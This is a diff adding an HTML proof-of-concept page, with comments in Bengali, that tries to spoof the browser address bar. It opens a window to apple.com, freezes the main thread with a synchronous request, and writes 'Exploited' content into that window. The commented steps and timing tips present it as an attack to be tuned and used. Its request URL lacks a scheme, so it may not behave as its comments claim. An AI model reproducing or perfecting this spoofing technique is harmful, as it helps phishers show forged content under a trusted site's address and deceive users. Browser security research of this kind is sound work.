@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Advanced Spoof Method 2</title>
+</head>
+<body>
+    <h1>UI Thread Freeze Test</h1>
+    <button onclick="testFreezeSpoof()">Execute Freeze Test</button>
+
+    <script>
+    function testFreezeSpoof() {
+        // ১. টার্গেট উইন্ডো ওপেন করা
+        var targetWin = window.open("about:blank", "_blank");
+        
+        // ২. রিয়েল সাইটের লোকেশন সেট করা
+        targetWin.location = "https://apple.com";
+
+        // ৩. ঠিক নেভিগেশনের মুহূর্তে মেইন থ্রেডকে সিঙ্ক্রোনাস রিকোয়েস্ট দিয়ে ব্লক করা
+        setTimeout(function() {
+            try {
+                var xhr = new XMLHttpRequest();
+                // একটি ফেক বা স্লো এন্ডপয়েন্টে 'false' (Synchronous) ফ্ল্যাগ দিয়ে রিকোয়েস্ট পাঠানো
+                xhr.open("GET", "typicode.com", false); 
+                xhr.send(null); // এই লাইনটি এক্সিকিউট হওয়ার সময় ব্রাউজার থ্রেড ফ্রিজ হবে
+
+                // ফ্রিজ হওয়ার সুযোগে কনটেন্ট ইনজেক্ট করা
+                targetWin.document.write("<h1>Exploited: Core Thread Frozen, Address Bar Mismatch.</h1>");
+                targetWin.document.close();
+            } catch(e) {
+                console.log("Thread protection or CORS blocked the sync write.");
+            }
+        }, 10); // টাইমিং নিখুঁত করার জন্য ১০-৫০ms এর মধ্যে ট্রাই করতে পারেন
+    }
+    </script>
+</body>
+</html>
